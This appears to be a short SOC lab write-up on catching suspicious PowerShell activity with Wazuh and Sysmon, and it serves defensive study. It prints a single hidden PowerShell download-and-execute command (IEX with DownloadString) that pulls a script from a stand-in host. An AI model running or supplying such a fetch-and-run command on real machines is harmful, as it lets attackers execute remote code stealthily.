# Wazuh Lab: Detecting Suspicious PowerShell Activity

## Objective
Simulate malicious PowerShell behavior on a Windows 11 machine and detect it using Wazuh SIEM and Sysmon logs.

## Environment
- **SIEM**: Wazuh Server (Ubuntu, Proxmox VM)
- **Endpoint**: Windows 11 (joined to domain, Wazuh agent + Sysmon)
- **Attacker Simulation**: User context (non-admin)

## Simulated Activity
Executed a suspicious PowerShell command mimicking malware behavior:

```powershell
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://testsite/malicious.ps1')"
```

## Detection
Sysmon Logs:
Event ID 1: Process creation detected for powershell.exe

Logged command-line arguments including IEX and DownloadString

## Wazuh Alerts:
Alert level 15 triggered

Message: "Executable file dropped in folder commonly used by malware"

## Screenshots
Suspicious PowerShell Command	Sysmon Log	Wazuh Alert

## Key Takeaways
- Sysmon provides deep visibility into process creation, command-line usage, and network activity.

- Wazuh effectively correlates endpoint activity to detect high-risk behavior like encoded or stealth PowerShell usage.

- Even without actual malware, simulated behavior alone can trigger detection—essential in SOC analysis and threat hunting.
